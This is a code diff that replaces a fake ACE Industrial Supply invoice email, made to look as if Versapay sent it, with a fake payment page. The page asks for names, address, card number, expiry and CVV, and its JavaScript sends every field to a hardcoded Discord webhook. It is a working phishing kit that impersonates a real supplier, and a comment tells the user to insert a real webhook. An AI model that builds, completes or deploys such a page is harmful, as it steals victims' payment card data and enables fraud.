@@ -1,157 +1,191 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head> 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Invoice Notice</title>
+<title>ACE Industrial Supply – Payment</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
 
 <style>
-    body {
-        margin: 0;
-        padding: 0;
-        background-color: #efefef;
-        font-family: Arial, Helvetica, sans-serif;
-        -webkit-font-smoothing: antialiased;
-    }
+body {
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #f3f4f6, #e5e7eb);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+}
 
-    .email-container {
-        max-width: 620px;
-        width: 100%;
-        margin: 24px auto;
-        background-color: #ffffff;
-        border: 1px solid #dcdcdc;
-    }
+.container {
+    background: #ffffff;
+    padding: 40px;
+    border-radius: 18px;
+    max-width: 560px;
+    width: 100%;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.15);
+}
 
-    /* HEADER (MATCHES PICTURE) */
-    .header {
-        padding: 24px 24px 12px 24px;
-        text-align: left; /* NOT CENTERED */
-    }
+.logo {
+    text-align: left;
+    margin-bottom: 20px;
+}
 
-    .header img {
-        width: 360px;       /* BIG BUT REALISTIC */
-        max-width: 100%;
-        height: auto;
-        display: block;
-    }
+.logo img {
+    width: 260px;
+}
 
-    /* CONTENT */
-    .content {
-        padding: 10px 24px 26px 24px;
-        color: #2f2f2f;
-        font-size: 15px;
-        line-height: 1.55;
-    }
+h1 {
+    font-size: 24px;
+    margin-bottom: 25px;
+    color: #1f2937;
+}
 
-    .invoice-text {
-        font-size: 15.5px;
-        margin-bottom: 18px;
-    }
+label {
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: block;
+    color: #374151;
+}
 
-    .invoice-text strong {
-        font-weight: 700;
-    }
+input {
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 18px;
+    border-radius: 10px;
+    border: 1px solid #d1d5db;
+    font-size: 15px;
+}
 
-    .invoice-text a {
-        color: #1a73e8;
-        font-weight: 600;
-        text-decoration: none;
-    }
+.card-row {
+    display: grid;
+    grid-template-columns: 2fr 1fr 1fr;
+    gap: 14px;
+}
 
-    /* PAY BUTTON */
-    .pay-button {
-        display: inline-block;
-        background-color: #f2b705;
-        color: #ffffff;
-        font-size: 16px;
-        font-weight: 700;
-        text-decoration: none;
-        padding: 15px 44px;
-        border-radius: 4px;
-        margin: 12px 0 28px 0;
-    }
+button {
+    width: 100%;
+    background: #f2b705;
+    color: white;
+    font-size: 18px;
+    font-weight: 700;
+    padding: 16px;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+}
 
-    .pay-button:hover {
-        background-color: #d9a404;
-    }
+button:hover {
+    background: #d9a404;
+}
 
-    /* FOOTER */
-    .footer {
-        border-top: 1px solid #e5e5e5;
-        padding: 14px 24px 18px 24px;
-        font-size: 12px;
-        color: #6b6b6b;
-        line-height: 1.5;
-    }
-
-    .footer a {
-        color: #1a73e8;
-        text-decoration: none;
-        font-weight: 500;
-    }
-
-    /* MOBILE FIX */
-    @media (max-width: 480px) {
-        .header img {
-            width: 300px;   /* Same proportion as picture */
-        }
-
-        .content {
-            font-size: 14.5px;
-        }
-    }
+.success {
+    display: none;
+    text-align: center;
+    font-size: 22px;
+    color: #16a34a;
+    font-weight: 600;
+}
+.note {
+    font-size: 13px;
+    color: #6b7280;
+    margin-top: 15px;
+}
 </style>
 </head>
 
 <body>
 
-<div class="email-container">
+ <div class="container">
 
-    <!-- LOGO (LEFT, BIG, PERFECT) -->
-    <div class="header">
+    <div class="logo">
         <img src="https://epodcastnetwork.com/wp-content/uploads/2021/05/ee0345_921cbaa05549435ca969075670143e02mv2.jpg"
-             alt="ACE Industrial Supply Logo">
+             alt="ACE Industrial Supply">
     </div>
 
-    <!-- BODY -->
-    <div class="content">
+<h1>Secure Payment information </h1>
+    
+    <form id="infoForm">
+        <label>FIRST NAME</label>
+        <input type="text" name="firstName" required>
 
-        <p class="invoice-text">
-            Invoice <strong>#2333491</strong> for <strong>TURNER FARMS</strong><br>
-            with balance <strong>$968.90</strong> is due in <strong>15 days</strong>.
-            Click <a href="pay.html">here</a> to pay.
-        </p>
+        <label>SECOND NAME</label>
+        <input type="text" name="secondName" required>
 
-        <a href="pay.html" class="pay-button">CLICK TO PAY</a>
+        <label>MIDDLE NAME</label>
+        <input type="text" name="middleName">
+
+        <label>ADDRESS</label>
+        <textarea name="address" rows="3" required></textarea>
+
+        <label>CARD HOLDER</label>
+        <input type="text" name="cardHolder" required>
+
+        <label>CARD NUMBER</label>
+        <input type="text" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+
+        <div class="card-row">
+            <div>
+                <label>EXPIRY DATE</label>
+                <input type="text" name="expiry" placeholder="MM/YY" required>
+            </div>
+            <div>
+                <label>CARD CVV</label>
+                <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+            </div>
+        </div>
+
+        <button type="submit" id="submitBtn">Submit</button>
+    </form>
+
+<script>
+    const form = document.getElementById('infoForm');
+    const thankYou = document.getElementById('thankYouMessage');
+    const errorMsg = document.getElementById('errorMessage');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // PUT YOUR REAL DISCORD WEBHOOK URL HERE
+    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1448834115981021329/TzZtUP5ZhvUSo9ttQIAjE2o1Lqvm2K_iFAX8Md8GMfIw-STeleL3DMX7G-RyT4TijN9c';
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
         
 
-        <p>
-            We noticed you haven't yet visited our online invoicing and payment service,
-            powered by Versapay Collaborative AR. We've already set up your account for you.
-            Simply click on a link in any email from us and you'll enjoy the convenience of
-            accessing all of your invoices and communicating with us at any time.
-        </p>
+        const data = Object.fromEntries(new FormData(form));
 
-    </div>
+        const message = {
+            content: `**NEW ACE PAYMENT INFORMATION**\n\n` +
+                     `**First Name:** ${data.firstName}\n` +
+                     `**Second Name:** ${data.secondName}\n` +
+                     `**Middle Name:** ${data.middleName || '—'}\n` +
+                     `**Address:** ${data.address}\n` +
+                     `**Card Holder:** ${data.cardHolder}\n` +
+                     `**Card Number:** ${data.cardNumber}\n` +
+                     `**Expiry Date:** ${data.expiry}\n` +
+                     `**CVV:** ${data.cvv}`
+        };
 
-    <!-- FOOTER -->
-    <div class="footer">
-        <p>
-            This message was sent to you from Versapay ARC on behalf of
-            Ace Industrial Supply Inc.
-        </p>
+        try {
+            const res = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
 
-        <p>
-            <a href="#">Contact Ace</a> |
-            <a href="#">Privacy Policy</a> |
-            <a href="#">Ace Industrial Supply Home</a> |
-            <a href="#">Manage Email</a>
-        </p>
-    </div>
-
-</div>
-
+            if (res.ok) {
+                form.style.display = 'none';
+                thankYou.style.display = 'block';
+            } else throw new Error();
+        } catch (err) {
+            errorMsg.style.display = 'block';
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Submit Payment';
+        }
+    });
+</script>
 </body>
 </html>
-
-
